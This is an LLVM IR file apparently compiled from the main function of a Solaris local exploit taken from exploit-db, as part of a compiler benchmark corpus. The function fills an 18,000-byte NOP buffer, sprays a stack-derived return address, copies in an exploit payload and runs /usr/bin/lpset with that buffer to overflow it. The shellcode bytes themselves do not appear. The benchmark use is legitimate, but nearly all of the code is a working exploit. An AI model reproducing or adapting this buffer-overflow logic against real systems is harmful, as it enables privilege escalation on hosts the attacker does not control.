; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_19206.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_19206.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@x = common dso_local global i8* null, align 8
@NOP = common dso_local global i32 0, align 4
@OFFSET = common dso_local global i32 0, align 4
@ret_adr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [54 x i8] c"0 : x86 Solaris2.6 J\0A1 : ?\0A2 : ?\0A3 : x86 Solaris 7 J\0A\00", align 1
@.str.1 = private unnamed_addr constant [15 x i8] c"Input (0-3) : \00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"%d\00", align 1
@adjust = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [25 x i8] c"Jumping Address = 0x%lx\0A\00", align 1
@STARTADR = common dso_local global i32 0, align 4
@i = common dso_local global i32 0, align 4
@ENDADR = common dso_local global i32 0, align 4
@exploit_code = common dso_local global i8* null, align 8
@EX_STADR = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [15 x i8] c"/usr/bin/lpset\00", align 1
@.str.5 = private unnamed_addr constant [6 x i8] c"lpset\00", align 1
@.str.6 = private unnamed_addr constant [3 x i8] c"-n\00", align 1
@.str.7 = private unnamed_addr constant [4 x i8] c"xfn\00", align 1
@.str.8 = private unnamed_addr constant [3 x i8] c"-a\00", align 1
@.str.9 = private unnamed_addr constant [7 x i8] c"lpcol1\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %6 = load i8*, i8** @x, align 8
  %7 = load i32, i32* @NOP, align 4
  %8 = call i32 @memset(i8* %6, i32 %7, i32 18000)
  %9 = call i32 (...) @get_sp()
  %10 = load i32, i32* @OFFSET, align 4
  %11 = sub nsw i32 %9, %10
  store i32 %11, i32* @ret_adr, align 4
  %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str, i64 0, i64 0))
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.1, i64 0, i64 0))
  %14 = call i32 @scanf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i32* @adjust)
  %15 = load i32, i32* @ret_adr, align 4
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.3, i64 0, i64 0), i32 %15)
  %17 = load i32, i32* @adjust, align 4
  %18 = load i32, i32* @STARTADR, align 4
  %19 = add nsw i32 %17, %18
  store i32 %19, i32* @i, align 4
  br label %20

20:                                               ; preds = %60, %2
  %21 = load i32, i32* @i, align 4
  %22 = load i32, i32* @ENDADR, align 4
  %23 = icmp slt i32 %21, %22
  br i1 %23, label %24, label %63

24:                                               ; preds = %20
  %25 = load i32, i32* @ret_adr, align 4
  %26 = and i32 %25, 255
  %27 = trunc i32 %26 to i8
  %28 = load i8*, i8** @x, align 8
  %29 = load i32, i32* @i, align 4
  %30 = add nsw i32 %29, 2
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %28, i64 %31
  store i8 %27, i8* %32, align 1
  %33 = load i32, i32* @ret_adr, align 4
  %34 = ashr i32 %33, 8
  %35 = and i32 %34, 255
  %36 = trunc i32 %35 to i8
  %37 = load i8*, i8** @x, align 8
  %38 = load i32, i32* @i, align 4
  %39 = add nsw i32 %38, 3
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %37, i64 %40
  store i8 %36, i8* %41, align 1
  %42 = load i32, i32* @ret_adr, align 4
  %43 = ashr i32 %42, 16
  %44 = and i32 %43, 255
  %45 = trunc i32 %44 to i8
  %46 = load i8*, i8** @x, align 8
  %47 = load i32, i32* @i, align 4
  %48 = add nsw i32 %47, 0
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %46, i64 %49
  store i8 %45, i8* %50, align 1
  %51 = load i32, i32* @ret_adr, align 4
  %52 = ashr i32 %51, 24
  %53 = and i32 %52, 255
  %54 = trunc i32 %53 to i8
  %55 = load i8*, i8** @x, align 8
  %56 = load i32, i32* @i, align 4
  %57 = add nsw i32 %56, 1
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds i8, i8* %55, i64 %58
  store i8 %54, i8* %59, align 1
  br label %60

60:                                               ; preds = %24
  %61 = load i32, i32* @i, align 4
  %62 = add nsw i32 %61, 4
  store i32 %62, i32* @i, align 4
  br label %20

63:                                               ; preds = %20
  store i32 0, i32* @i, align 4
  br label %64

64:                                               ; preds = %81, %63
  %65 = load i32, i32* @i, align 4
  %66 = load i8*, i8** @exploit_code, align 8
  %67 = call i32 @strlen(i8* %66)
  %68 = icmp slt i32 %65, %67
  br i1 %68, label %69, label %84

69:                                               ; preds = %64
  %70 = load i8*, i8** @exploit_code, align 8
  %71 = load i32, i32* @i, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds i8, i8* %70, i64 %72
  %74 = load i8, i8* %73, align 1
  %75 = load i8*, i8** @x, align 8
  %76 = load i32, i32* @i, align 4
  %77 = load i32, i32* @EX_STADR, align 4
  %78 = add nsw i32 %76, %77
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds i8, i8* %75, i64 %79
  store i8 %74, i8* %80, align 1
  br label %81

81:                                               ; preds = %69
  %82 = load i32, i32* @i, align 4
  %83 = add nsw i32 %82, 1
  store i32 %83, i32* @i, align 4
  br label %64

84:                                               ; preds = %64
  %85 = load i8*, i8** @x, align 8
  %86 = getelementptr inbounds i8, i8* %85, i64 5000
  store i8 61, i8* %86, align 1
  %87 = load i8*, i8** @x, align 8
  %88 = getelementptr inbounds i8, i8* %87, i64 18000
  store i8 0, i8* %88, align 1
  %89 = load i8*, i8** @x, align 8
  %90 = call i32 @execl(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.8, i64 0, i64 0), i8* %89, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.9, i64 0, i64 0), i8* null)
  %91 = load i32, i32* %3, align 4
  ret i32 %91
}

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @get_sp(...) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @scanf(i8*, i32*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
